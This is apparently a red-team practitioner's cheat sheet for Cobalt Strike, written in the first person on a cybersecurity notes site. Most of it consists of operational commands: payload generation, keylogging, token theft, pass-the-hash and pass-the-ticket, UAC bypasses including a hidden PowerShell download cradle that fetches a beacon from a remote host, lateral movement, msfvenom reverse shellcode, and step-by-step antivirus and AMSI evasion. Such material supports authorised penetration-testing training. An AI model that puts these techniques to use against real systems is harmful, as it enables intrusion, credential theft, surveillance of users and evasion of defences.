🏠 [Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

## 1. Listeners

Listeners are the server-side components that sit waiting for beacon callbacks. Getting your listener configuration right before generating any payload is the foundation of everything that follows.

### C2 Listeners

I set up standard C2 listeners through the GUI:

**Cobalt Strike → Listeners → Add/Edit**

From there I select the beacon protocol (HTTP, HTTPS, DNS, SMB), the interface/port to listen on, and any malleable C2 profile options if I've loaded one. HTTP/HTTPS are the workhorses; DNS is slow but useful when egress is heavily filtered.

### Peer-to-Peer Listeners

P2P listeners are essential for segmented networks — instead of every beacon calling home directly, they relay their traffic through a beacon that _does_ have C2 reachability. There are two types:

**Cobalt Strike → Listeners → Add/Edit**, then select either **TCP** or **SMB** beacon.

|Type|Mechanism|How to Connect|
|---|---|---|
|**TCP**|Binds to a port you specify on the compromised host|From another beacon: `connect <ip> <port>`|
|**SMB**|Listens on a named pipe you define|Automatically linked when spawned via `spawn` or `jump`|

I prefer SMB beacons inside a network — named pipe traffic blends naturally with normal Windows domain traffic and doesn't open a new listening port that could trigger a port scan alert.

---

## 2. Generating & Hosting Payloads

### File-Based Payloads

I generate file payloads through:

**Attacks → Packages**

|Option|Output|Notes|
|---|---|---|
|**HTMLApplication**|`.hta` file|Runs via mshta.exe|
|**MS Office Macro**|Office document|Requires macro execution to be allowed|
|**Windows Executable**|`.exe`, `.dll`, service `.exe`|Staged — requires beacon to call back for stage|
|**Windows Executable (S)**|Same, stageless|**Preferred** — entire payload in one file, fewer IoCs|

I almost always choose the stageless (`(S)`) option. Staged payloads require a second network round-trip to fetch the Beacon DLL, which introduces an extra detection opportunity and means the payload won't work if the C2 isn't reachable at the moment of execution.

### Web-Delivered Payloads

**Attacks → Web Drive-by → Scripted Web Delivery (S)**

This generates a one-liner that a target can paste into a shell to fetch and execute the beacon. Supported formats:

- `bitsadmin`
- `exe`
- `powershell`
- `python`

I use the PowerShell format most often on Windows targets where PowerShell is available and unrestricted (or can be bypassed). The bitsadmin format is a good fallback when PowerShell is locked down, since BITS is a legitimate Windows service that's often allowed through egress filters.

### Hosting Existing Files

If I've already built a payload (e.g., a custom-compiled beacon binary or a shellcode loader), I can host it directly without going through the generation step:

**Attacks → Web Drive-by → Host File**

I select the file and configure the web server port/URI. Cobalt Strike's built-in web server will serve it, letting me deliver it via a download cradle.

---

## 3. Beacon Operations

### Execution

```bash
# Execute a local .NET assembly in-memory (avoids writing to disk)
execute-assembly </path/to/executable.exe>
```

`execute-assembly` is one of the most useful beacon commands for running .NET tooling (SharpHound, Rubeus, Seatbelt, etc.) without dropping a file to disk. The assembly is injected into a temporary process and run in memory — significantly cleaner than uploading and executing a file.

### Reconnaissance

```bash
# Take a single screenshot using the PrintScr method
printscreen

# Take a single screenshot
screenshot

# Take periodic screenshots on a schedule
screenwatch
```

Screenshots are reviewed under **View → Screenshots**. I use `screenwatch` during prolonged access when I want to understand what the user is actively doing (e.g., checking whether they're working in a sensitive application). `printscreen` vs `screenshot` differ in the underlying API used — `printscreen` simulates a keypress, `screenshot` calls GDI directly.

### Keylogging

```bash
# Start keylogger, targeting a specific process
keylogger [pid] [x86|x64]
```

Captured keystrokes appear under **View → Keystrokes**. I inject the keylogger into the process I want to monitor — for credential capture, I target the browser or anything likely handling authentication input. Matching the architecture flag to the target process is important; a mismatch will cause injection to fail.

### PowerShell Integration

```bash
# Import a PowerShell module into the beacon's runspace
powershell-import C:\path\to\PowerView.ps1

# Run a PowerShell command
powershell <command>
```

`powershell-import` loads a `.ps1` script into the beacon's managed PowerShell runspace. After importing, subsequent `powershell` commands can call the module's functions directly. I use this constantly for PowerView, PowerUpSQL, and other PowerShell-based tooling without needing to write anything to disk.

---

## 4. Credential & Token Abuse

This is the operational heart of a post-exploitation engagement. Windows token manipulation lets me impersonate other users (including domain admins) without ever knowing their plaintext passwords in some cases.

### Token Impersonation with Credentials

```bash
# Create an impersonation token using plaintext credentials
make_token [DOMAIN\user] [password]

# Test the token — attempt to access C$ on a remote machine
ls \\computer_name\c$

# Drop the impersonation and revert to original context
rev2self
```

`make_token` creates a Windows token with **LOGON32_LOGON_NEW_CREDENTIALS** (type 9), meaning the local session remains unchanged but **network authentication** uses the new credentials. This is detected as **Event ID 4624, Logon Type 9** — common enough on a domain that it doesn't stand out unless a defender is specifically hunting type 9 logons.

Important: `make_token` only helps for _network_ actions (SMB, WinRM, LDAP). Local commands on the current machine still run under the original context.

### Stealing Tokens from Processes

```bash
# Steal the token from a running process
steal_token [pid]

# Test access using the stolen token
ls \\computer_name\c$

# Revert to original token
rev2self
```

`steal_token` impersonates a different user by duplicating the access token of an existing process. If I find a process belonging to a Domain Admin (e.g., via `ps`), stealing its token gives me their network identity for subsequent lateral movement. As the API documentation notes, it "allows the caller to clone its current token" — which is why the beacon output reads `Impersonated <username>` even when stealing your own token from a different process.

Unlike `make_token`, this _doesn't_ require knowing any credentials — just access to a process running as the target user.

### Spawning Processes as Another User

```bash
# Spawn a new process under different credentials
# Important: run from a directory you have read access to
cd C:\
spawnas [domain\username] [password] [listener]
```

`spawnas` launches an entirely new process (and associated beacon) under the specified credentials. This generates **Event ID 4624, Logon Type 2 (LOGON32_LOGON_INTERACTIVE)** — slightly more conspicuous than `make_token` since it looks like an interactive desktop logon. I use this when I need a fully authenticated session rather than just a network token.

### Process Injection

```bash
# Inject a beacon into an existing process
inject [pid] [x64|x86] [listener]
```

I inject beacons into existing processes to gain a foothold under a different user context, or to migrate out of a dying/suspicious process into something more stable. **OpSec note:** I avoid cross-architecture injection (`x86 → x64` or `x64 → x86`) unless absolutely necessary — it's noisier and more likely to cause stability issues. Where possible I always match the architecture of the target process.

### UAC Bypass

```bash
# Bypass UAC using a fake service
elevate svc-exe <listener>

# Bypass UAC via token duplication
elevate uac-token-duplication <listener>

# Bypass UAC via CMSTPLUA COM object (runs a download cradle)
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

These are needed on workstations/servers where the current session is a medium-integrity process (standard user who is _in_ the local Administrators group but UAC hasn't been bypassed). Each technique abuses a different auto-elevate mechanism:

- `svc-exe` — installs a temporary service binary that runs at high integrity
- `uac-token-duplication` — duplicates a high-integrity token from another process
- `uac-cmstplua` — abuses the CMSTPLUA COM object which auto-elevates; I use this to pull down a fresh high-integrity beacon via download cradle

### Pass the Hash

```bash
# Pass the hash to impersonate a user (requires local admin, patches LSASS)
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

# Alternatively, use Mimikatz directly for PtH
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"

# Steal the token from the process Mimikatz spawned
steal_token <pid>
```

Pass-the-hash lets me authenticate using a captured NTLM hash without cracking it. The Cobalt Strike built-in `pth` patches LSASS memory to inject the hash — this is a **high-risk operation** that requires local admin and won't work if **Protected Process Light (PPL)** is enabled on LSASS.

I prefer the Mimikatz method (`sekurlsa::pth`) when possible, since it spawns a new process with the injected credentials rather than patching in-place. Without specifying `/run`, Mimikatz will spawn a `cmd.exe` — if you're running as a desktop user, the victim will see that window appear, so I always specify `/run:"powershell -w hidden"` and immediately `steal_token` from the spawned PID.

### Pass the Ticket

There are several ways to do this depending on whether I'm starting from nothing or extracting a ticket already in memory.

**Option 1: Request a fresh TGT and load it**

```bash
# Request a TGT (AES256 is preferred — RC4 downgrades are detectable)
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec

# Create a dummy logon session to load the ticket into (avoids overwriting the current session's tickets)
make_token <domain>\<username> DummyPass

# Write the base64 ticket blob to disk and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\ticket.kirbi
```

The `make_token` step is critical — loading a TGT into the _existing_ logon session could overwrite it, breaking ongoing operations. Creating a fresh, isolated logon session first (even with a dummy password) gives me a clean container for the new ticket.

**Option 2: From a SYSTEM context — spawn a process with the ticket pre-loaded**

```bash
# Creates a new process with the TGT already loaded in its session
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

# Steal the token from that process
steal_token <pid>
```

This is my preferred method from SYSTEM — Rubeus creates the logon session, requests the ticket, loads it, and I just steal the token from the result. Clean and minimal.

**Option 3: Extract an existing ticket from memory and re-use it**

```bash
# List tickets currently in memory across all sessions
execute-assembly C:\path\Rubeus.exe triage

# Dump a specific interesting ticket by its LUID (target krbtgt tickets)
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap

# Create a fresh, isolated logon session
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

# Note the LUID and PID from the above output, then inject the ticket into that session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

# Steal the token from the newly created process
steal_token <pid>
```

This workflow is useful when I'm on a machine where a privileged user already has active Kerberos sessions — I can harvest their live TGT without needing their credentials or running a DCSync.

---

## 5. Lateral Movement

Cobalt Strike gives me two primary lateral movement commands: `jump` (spawns a new beacon remotely) and `remote-exec` (runs a command remotely without spawning a beacon automatically).

If I have an impersonation token active (via `make_token`, `steal_token`, etc.), that credential context is automatically applied to these commands.

### `jump` Command

```bash
jump [method] [target] [listener]
```

|Method|Arch|Mechanism|
|---|---|---|
|`psexec`|x86|Service via SCM, runs a Service EXE artifact|
|`psexec64`|x64|Service via SCM, runs a Service EXE artifact|
|`psexec_psh`|x86|Service via SCM, runs a PowerShell one-liner|
|`winrm`|x86|PowerShell remoting via WinRM|
|`winrm64`|x64|PowerShell remoting via WinRM|

I reach for `winrm64` first when WinRM is available — it's cleaner than the service-based methods and doesn't leave a service artifact to clean up. `psexec_psh` is useful when I need to avoid dropping a binary but can tolerate a noisy PowerShell-via-service execution.

### `remote-exec` Command

```bash
remote-exec [method] [target] [command]
```

|Method|Mechanism|
|---|---|
|`psexec`|Remote execution via Service Control Manager|
|`winrm`|Remote execution via WinRM (PowerShell)|
|`wmi`|Remote execution via WMI|

`remote-exec` is useful when I want to run an arbitrary command rather than spawn a new beacon. For WMI-based execution I often use it to launch a pre-uploaded SMB beacon:

```bash
# Upload the beacon binary to the target first
upload C:\Payloads\beacon-smb.exe

# Execute it remotely via WMI
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

WMI execution is stealthier than the psexec/SCM methods since it doesn't create a Windows Service event trail.

---

## 6. Pivoting

### SOCKS Proxy

```bash
# Open a SOCKS4a proxy on the team server, routed through the current beacon
socks 1080
```

This opens a SOCKS proxy on the Cobalt Strike team server, tunneling traffic through the beacon — from there I can route tools like `proxychains`, Impacket, or a browser through the compromised host's network segment. Essential for reaching hosts that can only be accessed from the internal network.

I configure proxychains on my attack box (`/etc/proxychains.conf`) with `socks4 127.0.0.1 1080` and then prefix any tool with `proxychains` to route it through the pivot.

### SSH Tunneling

```bash
# Establish an SSH connection through the beacon
ssh 10.10.17.12:22 username password
```

Direct SSH from a beacon — useful for pivoting into Linux hosts inside the network without needing to route through a SOCKS proxy or install additional tooling.

---

## 7. Session Passing

Sometimes I need to move a session between frameworks — typically passing a Cobalt Strike beacon session to Metasploit to use MSF's post-exploitation modules, or the reverse to upgrade an MSF session to a more capable Cobalt Strike beacon.

### Cobalt Strike → Metasploit (via Foreign Listener)

**Step 1: Set up the Metasploit handler on the attack box**

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j
```

**Step 2: Create a Foreign Listener in Cobalt Strike**

Cobalt Strike → Listeners → Add → set Payload to **Foreign HTTP** → set Host to the Metasploit machine IP and Port to 8080.

**Step 3: Spawn from the beacon**

```bash
spawn metasploit
```

Note: The foreign listener method only supports **x86 Meterpreter sessions** — I can't pass x64 this way. If I need an x64 Meterpreter I use the shellcode injection method instead.

### Cobalt Strike → Metasploit (via Shellcode Injection)

**Step 1: Generate Meterpreter shellcode on the attack box**

```bash
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
```

**Step 2: Set up the handler in Metasploit (same as above)**

**Step 3: Transfer the shellcode to the Cobalt Strike host and inject it**

```bash
# Find a suitable x64 process to inject into
ps

# Inject the raw shellcode into the chosen process
shinject <pid> x64 C:\Payloads\msf.bin
```

This method supports x64 Meterpreter sessions and is generally more reliable than the foreign listener approach.

### Metasploit → Cobalt Strike

**Step 1: Generate a stageless Beacon shellcode file**

Attacks → Packages → Windows Executable (S) → select desired listener → Output type: **Raw** → enable **Use x64 payload** → save.

**Step 2: Inject the Beacon shellcode via a Metasploit post module**

```bash
msf6 > use post/windows/manage/shellcode_inject
# Set the shellcode path to the raw Beacon shellcode file generated above
```

---

## 8. AV Evasion

The two primary toolkits for making Cobalt Strike's built-in payloads undetectable are the **Artifact Kit** (for compiled binary payloads) and the **Resource Kit** (for script-based payloads).

### Artifact Kit

The Artifact Kit lives at `/opt/cobaltstrike/artifact-kit` on the team server. It contains the source code and pre-compiled templates for the binary beacon wrappers Cobalt Strike generates.

**My workflow:**

1. **Identify the detected string** — I run the generated payload through [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) to find exactly which bytes are triggering Defender:
    
    ```bash
    .\ThreatCheck.exe -f .\beacon.exe
    ```
    
    ThreatCheck will binary-search the file and output the specific string or byte pattern that's flagged.
    
2. **Modify the source** — I edit the relevant source file in `/opt/cobaltstrike/artifact-kit/src-common/` to obfuscate, rename, or restructure whatever ThreatCheck flagged.
    
3. **Rebuild the templates:**
    
    ```bash
    cd /opt/cobaltstrike/artifact-kit
    ./build.sh
    ```
    
4. **Copy the output to the Windows Cobalt Strike client:**
    
    ```bash
    pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
    ```
    
5. **Load the aggressor script** — In the Cobalt Strike client, load `dist-pipe\artifact.cna` via Script Manager. This tells Cobalt Strike to use my modified templates from disk rather than the defaults built into the framework.
    

### Resource Kit

The Resource Kit handles script-based payloads — PowerShell, VBA macros, and HTA templates. The templates live in `C:\Tools\cobaltstrike\ResourceKit\` on the Windows client.

**My workflow:**

1. **Identify the AMSI-detected content** — I check the PowerShell template specifically against AMSI rather than Defender's file scanner:
    
    ```bash
    .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
    ```
    
    This tells me exactly which line(s) in the template script AMSI is flagging.
    
2. **Modify the flagged lines** — Usually this involves renaming variables, reordering statements, or encoding specific strings. The goal is to break the pattern AMSI is matching without changing the functional behaviour.
    
3. **Load the aggressor script** — Load `ResourceKit\resources.cna` via Script Manager to tell Cobalt Strike to use the modified templates.
    

### Quick Variable Rename Trick

A simple but effective quick win when the PowerShell template is getting caught — variable name substitution breaks many signature-based detections:

In `C:\Tools\cobaltstrike\ResourceKit\template.x64.ps1`:

- Rename `$var_code` → `$polop`
- Rename `$x` → `$ar`

Then reload via **Cobalt Strike → Script Manager → Load → `C:\Tools\cobaltstrike\ResourceKit\resources.cna`**

This is a minimal change but often sufficient to bypass weaker AMSI signatures that are keying on specific variable names from the default template.

---

## 9. BloodHound Integration

I regularly run SharpHound from a beacon to collect BloodHound data without touching disk beyond the assembly injection.

**Step 1: Start Neo4j (on the attack box)**

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
```

Then navigate to `http://localhost:7474/` and change the default password on first run.

**Step 2: Run SharpHound via execute-assembly**

```bash
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL
```

- `-c All` — run every collection method (sessions, group memberships, ACLs, trusts, local admins, etc.)
- `-d DOMAIN.LOCAL` — explicitly specify the target domain

The output ZIP is saved to the working directory of the beacon's process — I retrieve it with `download` and import it into BloodHound's GUI for attack-path analysis.

---
